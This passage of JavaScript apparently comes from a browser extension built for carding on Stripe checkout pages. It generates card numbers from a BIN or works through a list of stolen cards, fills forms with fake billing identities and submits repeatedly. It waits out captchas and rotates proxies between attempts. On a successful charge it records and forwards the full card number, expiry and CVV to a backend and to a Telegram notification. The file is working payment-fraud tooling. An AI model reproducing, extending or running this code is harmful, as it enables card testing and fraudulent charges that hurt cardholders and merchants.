        const key = el.getAttribute("data-stripe-publishable-key")
        if (key && key.startsWith("pk_test_")) return key
      }
    } catch (e) { }
    return null
  }
  async function fetchStripePaymentPageInit(csLive, pkLive) {
    if (!csLive) {
      throw new Error("cs_live identifier is required")
    }
    if (!pkLive) {
      throw new Error("pk_live publishable key is required")
    }
    const initUrl = `https://api.stripe.com/v1/payment_pages/${csLive}/init`
    const formData = new URLSearchParams({
      key: pkLive,
      eid: "NA",
      browser_locale: navigator.language || "en-US",
      browser_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC",
      redirect_type: "url"
    })
    try {
      const response = await fetch(initUrl, {
        method: "POST",
        headers: {
          "authority": "api.stripe.com",
          "accept": "application/json",
          "accept-language": "en-US,en;q=0.9",
          "cache-control": "no-cache",
          "content-type": "application/x-www-form-urlencoded",
          "user-agent": navigator.userAgent
        },
        body: formData.toString()
      })
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`)
      }
      return await response.json()
    } catch (error) {
      throw error
    }
  }
  function extractAmountFromInitResponse(data) {
    if (!data || typeof data !== "object") {
      return {
        amount: null,
        currency: null,
        rawAmount: null,
        email: null,
        businessUrl: null,
        successUrl: null,
        cancelUrl: null,
        merchantName: null,
        productName: null,
        productDescription: null,
        interval: null,
        sessionId: null
      }
    }
    const result = {
      amount: null,
      rawAmount: null,
      currency: null,
      email: null,
      businessUrl: null,
      merchantName: null,
      successUrl: null,
      cancelUrl: null,
      productName: null,
      productDescription: null,
      interval: null,
      sessionId: null,
      mode: null,
      status: null
    }

    function cleanUrl(url) {
      if (!url) return null;
      let clean = url.toString().trim();
      clean = clean.replace(/^https?:\/\//, '');
      clean = clean.replace(/^www\./, '');
      clean = clean.split('/')[0];
      clean = clean.split('?')[0];
      clean = clean.split('#')[0];
      clean = clean.split(':')[0];
      return clean || null;
    }

    let rawAmount = null
    let currency = null

    if (data.line_item_group?.localized_prices_metas && Array.isArray(data.line_item_group.localized_prices_metas)) {
      const usdMeta = data.line_item_group.localized_prices_metas.find(m => m.currency === 'usd');
      if (usdMeta && usdMeta.total && usdMeta.total > 0) {
        rawAmount = usdMeta.total;
        currency = 'usd';
      }
    }

    if (!rawAmount && data.line_item_group?.presentment_exchange_rate_meta) {
      const meta = data.line_item_group.presentment_exchange_rate_meta;
      if (meta.integration_currency && meta.exchange_rate && data.line_item_group.total) {
        const exchangeRate = parseFloat(meta.exchange_rate);
        if (exchangeRate > 0) {
          rawAmount = Math.round(data.line_item_group.total / exchangeRate);
          currency = meta.integration_currency;
        }
      }
    }

    if (!rawAmount && data.line_item_group?.total !== undefined && data.line_item_group.total > 0) {
      rawAmount = data.line_item_group.total;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.due !== undefined && data.line_item_group.due > 0) {
      rawAmount = data.line_item_group.due;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.subtotal !== undefined && data.line_item_group.subtotal > 0) {
      rawAmount = data.line_item_group.subtotal;
      currency = data.line_item_group.currency;
    }

    if (!rawAmount && data.line_item_group?.line_items?.[0]) {
      const item = data.line_item_group.line_items[0];
      if (item.total && item.total > 0) {
        rawAmount = item.total;
        currency = data.line_item_group.currency;
      } else if (item.price?.unit_amount && item.price.unit_amount > 0) {
        rawAmount = item.price.unit_amount * (item.quantity || 1);
        currency = item.price.currency || data.line_item_group.currency;
      }
    }

    if (!rawAmount && data.invoice?.amount_due !== undefined && data.invoice.amount_due > 0) {
      rawAmount = data.invoice.amount_due;
      currency = data.invoice.currency;
    }
    if (!rawAmount && data.invoice?.total !== undefined && data.invoice.total > 0) {
      rawAmount = data.invoice.total;
      currency = data.invoice.currency;
    }
    if (!rawAmount && data.invoice?.lines?.data?.[0]?.amount !== undefined) {
      rawAmount = data.invoice.lines.data[0].amount;
      currency = data.invoice.currency;
    }

    if (!rawAmount && data.amount_total !== undefined && data.amount_total > 0) {
      rawAmount = data.amount_total;
    }
    if (!rawAmount && data.amount !== undefined && typeof data.amount === 'number' && data.amount > 0) {
      rawAmount = data.amount;
    }
    if (!rawAmount && data.payment_intent?.amount !== undefined && data.payment_intent.amount > 0) {
      rawAmount = data.payment_intent.amount;
      currency = data.payment_intent.currency;
    }

    if (!rawAmount && data.amount_due !== undefined && data.amount_due > 0) {
      rawAmount = data.amount_due;
    }
    if (!rawAmount && data.amount_paid !== undefined && data.amount_paid > 0) {
      rawAmount = data.amount_paid;
    }

    if (rawAmount !== null && rawAmount > 0) {
      result.rawAmount = rawAmount;
      result.amount = (Number(rawAmount) / 100).toFixed(2);
    }

    result.currency = currency || data.currency || data.line_item_group?.currency || data.invoice?.currency || "usd";

    result.email = data.customer_email || data.customer?.email || null;

    let rawBusinessUrl = null;
    if (data.account_settings?.business_url) {
      rawBusinessUrl = data.account_settings.business_url;
    } else if (data.account_settings?.display_name) {

      const displayName = data.account_settings.display_name;
      if (displayName.includes('.') && !displayName.includes(' ')) {
        rawBusinessUrl = displayName;
      }
    }
    if (!rawBusinessUrl && data.statement_descriptor) {
      const stmt = data.statement_descriptor;
      if (stmt.includes('.')) {
        rawBusinessUrl = stmt;
      }
    }
    result.businessUrl = cleanUrl(rawBusinessUrl);

    result.merchantName = data.account_settings?.display_name ||
      data.account_settings?.order_summary_display_name ||
      data.account_settings?.merchant_of_record_display_name || null;

    result.successUrl = data.success_url || null;
    result.cancelUrl = data.cancel_url || null;

    const lineItem = data.line_item_group?.line_items?.[0] || data.invoice?.lines?.data?.[0];
    if (lineItem) {
      result.productName = lineItem.name || lineItem.price?.product?.name || null;
      result.productDescription = lineItem.description || lineItem.price?.product?.description || null;
      result.interval = lineItem.price?.recurring?.interval || null;
    }

    result.sessionId = data.session_id || null;
    result.mode = data.mode || null;
    result.status = data.status || null;

    return result;
  }
  function fallbackExtractFromPage() {
    const result = {
      amount: null,
      currency: null,
      email: null,
      businessUrl: null,
      successUrl: null,
      method: "fallback_dom"
    }
    try {
      const pageContent = document.documentElement.innerHTML
      const pricePatterns = [
        /\$(\d+(?:\.\d{2})?)/,
        /(\d+(?:\.\d{2})?)\s*(?:USD|CAD|EUR|GBP)/i,
        /"amount":\s*(\d+)/,
        /"unit_amount":\s*(\d+)/,
        /"unit_amount_decimal":\s*"(\d+)"/
      ]
      for (const pattern of pricePatterns) {
        const match = pageContent.match(pattern)
        if (match) {
          const rawAmount = match[1]
          if (rawAmount.length > 2 && !rawAmount.includes('.')) {
            result.amount = (Number(rawAmount) / 100).toFixed(2)
          } else {
            result.amount = Number(rawAmount).toFixed(2)
          }
          break
        }
      }
      const emailMatch = pageContent.match(/"customer_email":\s*"([^"]+)"/) ||
        pageContent.match(/"email":\s*"([^"]+@[^"]+)"/)
      if (emailMatch) result.email = emailMatch[1]
      const businessUrlMatch = pageContent.match(/"business_url":\s*"([^"]+)"/)
      if (businessUrlMatch) result.businessUrl = businessUrlMatch[1]
      const successUrlMatch = pageContent.match(/"success_url":\s*"([^"]+)"/) ||
        pageContent.match(/"return_url":\s*"([^"]+)"/)
      if (successUrlMatch) result.successUrl = successUrlMatch[1]
      const currencyMatch = pageContent.match(/"currency":\s*"([a-z]{3})"/i)
      if (currencyMatch) result.currency = currencyMatch[1]
    } catch (error) {
    }
    return result
  }
  async function getStripePaymentAmount(urlOrResponse, providedPkLive = null) {
    if (isInvoiceStripePage()) {
      const invData = extractInvoiceData();
      if (invData) {
        const displayName = getInvoiceDisplayName();
        Object.assign(extractedPaymentData, {
          amount: getInvoiceAmount(),
          rawAmount: invData.amount,
          currency: invData.currency,
          email: invData.email,
          businessUrl: invData.businessUrl || displayName,
          merchantName: displayName,
          productName: invData.productName
        });
        return {
          success: true,
          csLive: null,
          pkLive: null,
          amount: getInvoiceAmount(),
          rawAmount: invData.amount,
          currency: invData.currency,
          email: invData.email,
          businessUrl: invData.businessUrl || displayName,
          merchantName: displayName,
          productName: invData.productName,
          method: "invoice_extract"
        };
      }
    }

    const csLive = extractCsLive(urlOrResponse)
    const pkLive = providedPkLive || extractPkLive()
    if (csLive && pkLive) {
      try {
        const initResponse = await fetchStripePaymentPageInit(csLive, pkLive)
        const paymentDetails = extractAmountFromInitResponse(initResponse)
        paymentDetails.method = "init_request"
        Object.assign(extractedPaymentData, {
          amount: paymentDetails.amount,
          rawAmount: paymentDetails.rawAmount,
          currency: paymentDetails.currency,
          email: paymentDetails.email,
          businessUrl: paymentDetails.businessUrl,
          successUrl: paymentDetails.successUrl,
          cancelUrl: paymentDetails.cancelUrl,
          merchantName: paymentDetails.merchantName,
          productName: paymentDetails.productName,
          productDescription: paymentDetails.productDescription,
          interval: paymentDetails.interval,
          sessionId: paymentDetails.sessionId,
          mode: paymentDetails.mode,
          status: paymentDetails.status
        })
        return {
          success: true,
          csLive: csLive,
          pkLive: pkLive,
          ...paymentDetails,
          rawResponse: initResponse
        }
      } catch (error) {
      }
    } else {
    }
    const fallbackDetails = fallbackExtractFromPage()
    if (fallbackDetails.amount || fallbackDetails.email || fallbackDetails.businessUrl) {
      if (fallbackDetails.amount) extractedPaymentData.amount = fallbackDetails.amount
      if (fallbackDetails.currency) extractedPaymentData.currency = fallbackDetails.currency
      if (fallbackDetails.email) extractedPaymentData.email = fallbackDetails.email
      if (fallbackDetails.businessUrl) extractedPaymentData.businessUrl = fallbackDetails.businessUrl
      if (fallbackDetails.successUrl) extractedPaymentData.successUrl = fallbackDetails.successUrl
      return {
        success: true,
        csLive: csLive,
        pkLive: pkLive,
        ...fallbackDetails
      }
    }
    return {
      success: false,
      error: "Could not extract payment data using any method",
      csLive: csLive,
      pkLive: pkLive
    }
  }
  async function autoExtractPaymentFromUrl() {
    const currentUrl = window.location.href
    const result = await getStripePaymentAmount(currentUrl)
    if (result.success) {
    } else {
    }
    return result
  }
  window.kimtimStripeUtils = {
    extractCsLive,
    extractPkLive,
    fetchStripePaymentPageInit,
    extractAmountFromInitResponse,
    fallbackExtractFromPage,
    getStripePaymentAmount
  }
  async function checkResponseForSuccess(response) {
    return response
  }
  async function checkResponseForDeclineCodes(response) {
    return response
  }
  async function handleSuccess() {
    if (attemptCount === 0 || !attemptCount) {
      return
    }
    if (hasHit || hasNotified) {
      return
    }
    hasNotified = true
    hasHit = true
    let timeTaken = "0s"
    if (cardAttemptStartTime) {
      const elapsed = Math.round((Date.now() - cardAttemptStartTime) / 1000)
      const mins = Math.floor(elapsed / 60)
      const secs = elapsed % 60
      timeTaken = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`
    }
    if (isAutoSubmitting) {
      stopAutoSubmit()
    }
    // Build card string: prefer window var, fall back to realCardValues (same-scope, always set by autoFillForm)
    const _rv = realCardValues
    const _rvFull = (_rv && _rv.cardNumber)
      ? (function() {
          const _exp = (_rv.cardExpiry || '/').split('/')
          return _rv.cardNumber + '|' + (_exp[0] || '??') + '|' + (_exp[1] || '??') + '|' + (_rv.cardCvc || '???')
        })()
      : null
    const cardInfo = window.generatedCardFull || window.generatedCard || _rvFull || "Unknown"
    if (typeof sendToBackground === 'function') {
      sendToBackground({
        type: "UPDATE_LOCAL_STATS",
        payload: {
          hit: true,
          historyEntry: {
            time: new Date().toLocaleString(),
            site: window.location.hostname,
            card: cardInfo,
            amount: (extractedPaymentData.amount === '0' || extractedPaymentData.amount === '0.00' || !extractedPaymentData.amount) ? 'Free Trial' : (extractedPaymentData.amount || 'Free Trial'),
            currency: extractedPaymentData.currency || 'usd'
          }
        }
      });
    }

    if (window.generatedCardFull) {
      const parts = window.generatedCardFull.split("|")
      addToHistory(parts[0], parts[1], parts[2], parts[3], "SUCCESS")
    } else if (_rvFull) {
      const parts = _rvFull.split("|")
      addToHistory(parts[0], parts[1], parts[2], parts[3], "SUCCESS")
    } else if (window.generatedCard) {
      addToHistory(window.generatedCard, "??", "??", "???", "SUCCESS")
    } else {
      addToHistory("Unknown", "??", "??", "???", "SUCCESS")
    }
    showSuccessToast(attemptCount, timeTaken)
    createColorBallDrop()
    autoDownloadPaymentScreenshot()
    const container = document.querySelector(".card-generator-overlay")
    if (container) {
      container.classList.add("overlay-hidden")
    }
    const key = "cardGeneratorHit_" + window.location.href
    localStorage.setItem(key, "true")
    window.postMessage({ type: "PLAY_SUCCESS_SOUND", volume: soundVolume }, "*")

    const savedToken = localStorage.getItem(K.TOKEN)
    if (savedToken && (window.generatedCardFull || _rvFull) && attemptCount > 0) {
      await recordHit(savedToken, {
        fullCard: window.generatedCardFull || _rvFull,
        amount: (extractedPaymentData.amount === '0' || extractedPaymentData.amount === '0.00' || !extractedPaymentData.amount) ? 'Free Trial' : extractedPaymentData.amount,
        currency: extractedPaymentData.currency || 'usd',
        merchant: extractedPaymentData.businessUrl || window.location.hostname
      })
    }

    if (!extractedPaymentData.businessUrl) {
      extractedPaymentData.businessUrl = window.location.hostname || window.location.origin
    }
    if (!extractedPaymentData.successUrl) {
      extractedPaymentData.successUrl = window.location.href
    }
    window.postMessage(
      {
        type: "SEND_TELEGRAM_NOTIFICATION",
        data: {
          ...extractedPaymentData,
          amount: (extractedPaymentData.amount === '0' || extractedPaymentData.amount === '0.00' || !extractedPaymentData.amount) ? 'Free Trial' : extractedPaymentData.amount,
          currency: extractedPaymentData.currency || 'usd',
          cardNumber: window.generatedCardFull || window.generatedCard || _rvFull || "",
          bin: getSavedBIN() || "",
          tgForwardEnabled: tgForwardEnabled,
          userId: userId || savedId || "",
          userName: customName || userFirstName || "",
          attempt: attemptCount,
          timeTaken: timeTaken,
        },
      },
      "*",
    )
  }
  function autoDownloadPaymentScreenshot() {
    window.postMessage({ type: 'CAPTURE_SCREENSHOT_REQUEST' }, '*')
  }
  function showSuccessToast(attempt, timeTaken) {
    const existing = document.querySelector(".success-toast")
    if (existing) existing.remove()
    const now = new Date()
    let hours = now.getHours()
    const minutes = String(now.getMinutes()).padStart(2, '0')
    const ampm = hours >= 12 ? 'PM' : 'AM'
    hours = hours % 12
    hours = hours ? hours : 12
    const timeStr = String(hours).padStart(2, '0') + '.' + minutes + ampm
    const day = String(now.getDate()).padStart(2, '0')
    const month = String(now.getMonth() + 1).padStart(2, '0')
    const year = String(now.getFullYear()).slice(-2)
    const dateStr = day + '|' + month + '|' + year
    const toast = document.createElement("div")
    toast.className = "success-toast"
    toast.innerHTML = `
    <div class="success-toast-content">
      <div class="success-ripple-container">
        <div class="success-ripple-ring"></div>
        <div class="success-ripple-ring"></div>
        <div class="success-check">✓</div>
      </div>
      <div class="success-toast-text">
        <div class="success-toast-title">Payment Successful</div>
        <div class="success-toast-details">Attempt: ${attempt} | T/t: ${timeTaken}</div>
        <div class="success-toast-details">Time: ${timeStr} | Date: ${dateStr}</div>
      </div>
    </div>
  `
    document.body.appendChild(toast)
    toast.classList.add("show")
  }

  function createColorBallDrop() {
    const container = document.createElement("div")
    container.className = "color-ball-container"
    document.body.appendChild(container)
    function createBall() {
      const ball = document.createElement("div")
      const posClass = "ball-pos-" + Math.floor(Math.random() * 20) * 5
      const sizeClass = "ball-size-" + ["sm", "md", "lg"][Math.floor(Math.random() * 3)]
      const colorClass = "ball-color-" + Math.floor(Math.random() * 8)
      const delayClass = "ball-delay-" + Math.floor(Math.random() * 10)
      const durationClass = "ball-dur-" + Math.floor(Math.random() * 3)
      ball.className = `color-ball ${posClass} ${sizeClass} ${colorClass} ${delayClass} ${durationClass}`
      container.appendChild(ball)
      setTimeout(() => ball.remove(), 6000)
    }
    for (let i = 0; i < 50; i++) {
      createBall()
    }
    const spawnInterval = setInterval(() => {
      if (!document.body.contains(container)) {
        clearInterval(spawnInterval)
        return
      }
      for (let i = 0; i < 10; i++) {
        createBall()
      }
    }, 500)
  }
  const randomNames = [
    "kimtim",
  ]
  const randomHumanNames = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles",
    "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen",
    "Daniel", "Matthew", "Anthony", "Mark", "Donald", "Steven", "Paul", "Andrew", "Joshua", "Kenneth",
    "Nancy", "Betty", "Margaret", "Sandra", "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle",
    "Alex", "Chris", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn", "Avery", "Cameron"
  ]
  const randomStreets = [
    "Main Street",
    "Oak Road",
    "Park Avenue",
    "Maple Drive",
    "Cedar Lane",
    "Pine Street",
    "Lake Drive",
    "Forest Avenue",
    "River Road",
    "Hill Street",
  ]
  function getRandomName() {
    return randomNames[Math.floor(Math.random() * randomNames.length)]
  }
  function getRandomEmail() {
    const domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com"]
    const name = randomHumanNames[Math.floor(Math.random() * randomHumanNames.length)].toLowerCase()
    const randomNum = Math.floor(Math.random() * 9999)
    const domain = domains[Math.floor(Math.random() * domains.length)]
    return name + randomNum + "@" + domain
  }
  function getRandomStreet() {
    const street = randomStreets[Math.floor(Math.random() * randomStreets.length)]
    const number = Math.floor(Math.random() * 999) + 1
    return number + " " + street
  }
  function simulateInput(element, value) {
    if (!element) return
    element.focus()
    const nativeInputValueSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.set
    const nativeTextAreaValueSetter = Object.getOwnPropertyDescriptor(
      window.HTMLTextAreaElement.prototype,
      "value",
    )?.set
    if (element.tagName === "INPUT" && nativeInputValueSetter) {
      nativeInputValueSetter.call(element, value)
    } else if (element.tagName === "TEXTAREA" && nativeTextAreaValueSetter) {
      nativeTextAreaValueSetter.call(element, value)
    } else {
      element.value = value
    }
    element.dispatchEvent(new Event("input", { bubbles: true }))
    element.dispatchEvent(new Event("change", { bubbles: true }))
    element.dispatchEvent(new KeyboardEvent("keyup", { bubbles: true }))
    element.blur()
  }
  function simulateSelectChange(element, value) {
    if (!element) return
    element.focus()
    element.value = value
    element.dispatchEvent(new Event("input", { bubbles: true }))
    element.dispatchEvent(new Event("change", { bubbles: true }))
    element.dispatchEvent(new CustomEvent("select:change", { bubbles: true, detail: { value } }))
    element.blur()
  }
  const realCardValues = {
    cardNumber: "",
    cardExpiry: "",
    cardCvc: "",
  }
  async function autoFillForm() {
    let card, mm, yy, cvv
    if (currentMode === "cc") {
      const ccData = getNextCC()
      if (!ccData) {
        showWarning("❌ No more CCs in list", "error")
        stopAutoSubmit()
        return
      }
      card = ccData.number
      mm = ccData.month
      yy = ccData.year
      cvv = ccData.cvv
      const ccInfo = document.querySelector(".cc-info")
      if (ccInfo) ccInfo.textContent = `${currentCCIndex}/${ccList.length} used`
    } else {
      const bin = getSavedBIN()
      if (!bin) return
      const generated = generateCard(bin)
      if (!generated) return
      card = generated.card
      mm = generated.month
      yy = generated.year
      cvv = generated.cvv
    }
    window.generatedCard = card
    window.generatedCardFull = `${card}|${mm}|${yy}|${cvv}`
    realCardValues.cardNumber = card
    realCardValues.cardExpiry = mm + "/" + yy
    realCardValues.cardCvc = cvv
    showCardToast(card, mm, yy, cvv)
    const maskedCard = "0000000000000000"
    const maskedExpiry = "01/30"
    const maskedCvv = "000"

    const fieldMappings = [
      {
        selectors: [
          "#cardNumber", '[name="cardNumber"]', '[autocomplete="cc-number"]',
          '[data-elements-stable-field-name="cardNumber"]',
          'input[placeholder*="Card number"]',
          'input[placeholder*="card number"]',
          'input[aria-label*="Card number"]',
          '[class*="CardNumberInput"] input',
          '[class*="cardNumber"] input',
          'input[name="number"]',
          'input[id*="card-number"]',
          'input[name*="card_number"]',
          'input[placeholder*="0000"]',
          'input[placeholder*="1234"]'
        ],
        value: maskedCard,
        realValue: card,
      },
      {
        selectors: [
          "#cardExpiry", '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
          '[data-elements-stable-field-name="cardExpiry"]',
          'input[placeholder*="MM / YY"]',
          'input[placeholder*="MM/YY"]',
          'input[placeholder*="MM"]',
          'input[aria-label*="expir"]',
          '[class*="CardExpiry"] input',
          '[class*="expiry"] input',
          'input[name="expiry"]',
          'input[name="exp"]'
        ],
        value: maskedExpiry,
        realValue: mm + "/" + yy,
      },
      {
        selectors: [
          "#cardCvc", '[name="cardCvc"]', '[autocomplete="cc-csc"]',
          '[data-elements-stable-field-name="cardCvc"]',
          'input[placeholder*="CVC"]',
          'input[placeholder*="CVV"]',
          'input[aria-label*="CVC"]',
          'input[aria-label*="CVV"]',
          'input[aria-label*="security code"]',
          'input[aria-label*="Security code"]',
          '[class*="CardCvc"] input',
          '[class*="cvc"] input',
          'input[name="cvc"]',
          'input[name="cvv"]'
        ],
        value: maskedCvv,
        realValue: cvv
      },
      {
        selectors: [
          "#billingName", '[name="billingName"]', '[autocomplete="cc-name"]', '[autocomplete="name"]',
          'input[placeholder*="Name on card"]',
          'input[placeholder*="name on card"]',
          'input[aria-label*="Name"]',
          '[class*="billingName"] input',
          'input[name="name"]'
        ],
        value: customName || getRandomName(),
      },
      {
        selectors: [
          'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
          'input[id*="email"]', 'input[placeholder*="email"]', 'input[placeholder*="Email"]',
          '[class*="email"] input',
          'input[aria-label*="email"]'
        ],
        value: customEmail || getRandomEmail(),
      },
      {
        selectors: ["#billingAddressLine1", '[name="billingAddressLine1"]', '[autocomplete="address-line1"]'],
        value: getRandomStreet(),
      },
      {
        selectors: ["#billingLocality", '[name="billingLocality"]', '[autocomplete="address-level2"]'],
        value: "Macau",
      },
      {
        selectors: ["#billingPostalCode", '[name="billingPostalCode"]', '[autocomplete="postal-code"]'],
        value: "999078",
      },
    ]

    let filledCount = 0;
    for (const mapping of fieldMappings) {
      for (const selector of mapping.selectors) {
        const element = document.querySelector(selector)
        if (element) {
          simulateInput(element, mapping.value)
          if (mapping.realValue) {
            element.dataset.realValue = mapping.realValue
          }
          filledCount++;
          await new Promise((r) => setTimeout(r, 8))
          break
        }
      }
    }

    if (isInvoiceStripePage() || filledCount < 3) {
      await fillStripeElementsIframes(card, mm, yy, cvv);
    }

    const countrySelectors = ["#billingCountry", '[name="billingCountry"]', '[autocomplete="country"]']
    for (const selector of countrySelectors) {
      const element = document.querySelector(selector)
      if (element) {
        simulateSelectChange(element, "MO")
        break
      }
    }
    await new Promise((r) => setTimeout(r, 30))
  }

  async function fillStripeElementsIframes(card, mm, yy, cvv) {
    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    const iframes = document.querySelectorAll('iframe[name*="__privateStripeFrame"], iframe[title*="Secure"], iframe[src*="stripe"]');

    for (const iframe of iframes) {
      const name = iframe.name || '';
      const title = iframe.title || '';

      const isCardNumber = name.includes('cardNumber') || title.toLowerCase().includes('card number');
      const isExpiry = name.includes('cardExpiry') || title.toLowerCase().includes('expir');
      const isCvc = name.includes('cardCvc') || title.toLowerCase().includes('cvc') || title.toLowerCase().includes('security');

      try {
        const rect = iframe.getBoundingClientRect();
        if (rect.width > 0 && rect.height > 0) {
          const x = rect.left + rect.width / 2;
          const y = rect.top + rect.height / 2;

          const elementAtPoint = document.elementFromPoint(x, y);
          if (elementAtPoint) {
            elementAtPoint.click();
            await wait(20);
          }
        }
      } catch (e) {
      }
    }

    const stripeInputWrappers = document.querySelectorAll('[class*="StripeElement"], [class*="CardElement"], [class*="PaymentElement"]');
    for (const wrapper of stripeInputWrappers) {
      const rect = wrapper.getBoundingClientRect();
      if (rect.width > 0 && rect.height > 0) {
        wrapper.click();
        await wait(20);
      }
    }

    if (isInvoiceStripePage()) {
      await simulateStripeElementsInput(card, mm, yy, cvv);
    }
  }

  async function simulateStripeElementsInput(card, mm, yy, cvv) {
    const wait = (ms) => new Promise(r => setTimeout(r, ms));

    async function typeText(text, delay = 50) {
      for (const char of text) {
        const keydownEvent = new KeyboardEvent('keydown', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        const keypressEvent = new KeyboardEvent('keypress', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        const inputEvent = new InputEvent('input', {
          data: char,
          inputType: 'insertText',
          bubbles: true,
          cancelable: true
        });

        const keyupEvent = new KeyboardEvent('keyup', {
          key: char,
          code: `Key${char.toUpperCase()}`,
          charCode: char.charCodeAt(0),
          keyCode: char.charCodeAt(0),
          which: char.charCodeAt(0),
          bubbles: true,
          cancelable: true
        });

        document.activeElement?.dispatchEvent(keydownEvent);
        document.activeElement?.dispatchEvent(keypressEvent);
        document.activeElement?.dispatchEvent(inputEvent);
        document.activeElement?.dispatchEvent(keyupEvent);

        await wait(delay);
      }
    }

    async function pressTab() {
      const tabDown = new KeyboardEvent('keydown', { key: 'Tab', code: 'Tab', keyCode: 9, which: 9, bubbles: true });
      const tabUp = new KeyboardEvent('keyup', { key: 'Tab', code: 'Tab', keyCode: 9, which: 9, bubbles: true });
      document.activeElement?.dispatchEvent(tabDown);
      document.activeElement?.dispatchEvent(tabUp);
      await wait(140);
    }

    async function findAndClickField(selectors, fieldName) {
      for (const selector of selectors) {
        try {
          const elements = document.querySelectorAll(selector);
          for (const element of elements) {
            const rect = element.getBoundingClientRect();
            if (rect.width > 0 && rect.height > 0) {
              element.click();
              element.focus?.();
              await wait(140);
              return true;
            }
          }
        } catch (e) { }
      }
      return false;
    }

    const cardNumberSelectors = [
      '[class*="CardNumberElement"]',
      '[class*="cardNumber"]',
      '[data-field="number"]',
      'iframe[title*="card number" i]',
      'iframe[name*="cardNumber"]',
      'input[placeholder*="0000"]',
      'input[placeholder*="1234"]',
      'input[autocomplete="cc-number"]',
      '[class*="CardNumber"] input',
      '[class*="card-number"] input'
    ];

    let cardFieldFound = await findAndClickField(cardNumberSelectors, 'card number');

    if (!cardFieldFound) {
      const stripeElements = document.querySelectorAll('[class*="StripeElement"], [class*="CardElement"], [class*="PaymentElement"]');
      for (const el of stripeElements) {
        const rect = el.getBoundingClientRect();
        if (rect.width > 100 && rect.height > 20) {
          el.click();
          await wait(200);
          cardFieldFound = true;
          break;
        }
      }
    }

    if (!cardFieldFound) {
      const paymentSection = document.querySelector('[class*="payment"], [class*="Payment"], [class*="card"], [class*="Card"], form');
      if (paymentSection) {
        const firstInput = paymentSection.querySelector('input[type="text"], input:not([type]), [contenteditable]');
        if (firstInput) {
          firstInput.click();
          firstInput.focus?.();
          await wait(140);
          cardFieldFound = true;
        }
      }
    }

    if (cardFieldFound) {
      await typeText(card, 20);
      await wait(200);

      await pressTab();
      await typeText(mm + yy, 20);
      await wait(200);

      await pressTab();
      await typeText(cvv, 20);
      await wait(200);
    }

  }

  function isSubmitButtonAvailable() {
    const submitButton = document.querySelector(".SubmitButton-IconContainer")
    if (submitButton) {
      const button = submitButton.closest(".SubmitButton")
      if (button) {
        const computedStyle = window.getComputedStyle(button)
        if (!button.disabled &&
          !button.classList.contains("SubmitButton--incomplete") &&
          computedStyle.opacity !== "0" &&
          computedStyle.visibility !== "hidden" &&
          computedStyle.display !== "none") {
          return true;
        }
      }
    }

    if (isInvoiceStripePage()) {
      const payButtons = document.querySelectorAll('button');
      for (const btn of payButtons) {
        const text = (btn.textContent || '').trim().toLowerCase();
        if ((text === 'pay' || text.startsWith('pay ') || text.includes('pay $')) && !btn.disabled) {
          return true;
        }
      }
    }

    return false;
  }
  async function waitForSubmitButton(timeout = 10000) {
    const startTime = Date.now()
    return new Promise((resolve) => {
      const checkButton = () => {
        if (isSubmitButtonAvailable()) {
          resolve(true)
        } else if (!isAutoSubmitting || Date.now() - startTime > timeout) {
          resolve(false)
        } else {
          setTimeout(checkButton, 50)
        }
      }
      checkButton()
    })
  }
  async function handleAutoSubmit() {
    while (isAutoSubmitting && !hasHit) {
      if (hasHit) {
        break
      }

      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise((resolve) => setTimeout(resolve, 500))
        }
        if (!isAutoSubmitting || hasHit) break
        await new Promise((resolve) => setTimeout(resolve, 1000))
      }

      currentCardProcessed = false
      cardAttemptStartTime = Date.now()
      await autoFillForm()
      if (hasHit) break
      const buttonReady = await waitForSubmitButton()
      if (!isAutoSubmitting || hasHit || !buttonReady) break
      const buttonContainer = document.querySelector(".SubmitButton-IconContainer")
      if (buttonContainer) {
        const button = buttonContainer.closest(".SubmitButton") || buttonContainer.closest("button")
        if (button) button.click()
      }

      if (checkCaptchaVisible()) {
        while (checkCaptchaVisible() && isAutoSubmitting && !hasHit) {
          await new Promise((resolve) => setTimeout(resolve, 500))
        }
        if (!isAutoSubmitting || hasHit) break
        await new Promise((resolve) => setTimeout(resolve, 500))
      }

      await waitForResponse(15000)
      if (!isAutoSubmitting || hasHit) break

      if (window.kimtimProxy && window.kimtimProxy.autoRotate) {
        if (typeof updateBottomIpBar !== 'undefined') {
          await window.kimtimProxy.rotateToNextProxy(updateBottomIpBar);
        } else {
          await window.kimtimProxy.rotateToNextProxy();
        }
        await new Promise((resolve) => setTimeout(resolve, 1000));
      }

      await new Promise((resolve) => setTimeout(resolve, 500))
      await waitForSubmitButton()
    }
    if (hasHit) {
      stopAutoSubmit()
    }
  }

  let hasClickedCardTab = false;

  function clickCardPaymentTab() {
    if (hasClickedCardTab) return;

    try {
      function simulateRealClick(element) {
        if (!element) return false;

        if (element.tagName === 'INPUT') {
          const label = element.closest('label') || document.querySelector(`label[for="${element.id}"]`);
          if (label) {
            label.click();
            return true;
          }

          const clickableParent = element.closest('[role="radio"]') ||
            element.closest('[role="tab"]') ||
            element.closest('[class*="Tab"]') ||
            element.closest('[class*="Option"]') ||
            element.closest('[class*="Method"]') ||
            element.parentElement;
          if (clickableParent && clickableParent !== element) {
